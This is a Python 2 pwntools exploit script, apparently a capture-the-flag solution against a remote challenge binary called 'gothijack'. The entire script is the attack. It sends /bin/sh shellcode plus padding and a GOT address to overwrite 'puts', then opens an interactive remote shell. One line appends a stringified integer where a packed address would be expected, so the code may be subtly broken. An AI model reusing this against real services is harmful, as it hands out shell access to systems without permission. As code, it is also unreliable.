#!/usr/bin/env python2

from pwn import *

import pwnlib.shellcraft
import pwnlib.elf

context.log_level = 'debug'
context.arch = 'amd64'

f = ELF('./gothijack')

p = remote('isc.taiwan-te.ch', 10003)

payload = asm(shellcraft.sh())
payload += 'A' * 16
payload += str(f.got['puts'])

p.sendline(payload)
p.sendline(p64(f.symbols['name']))

p.interactive()
p.close()

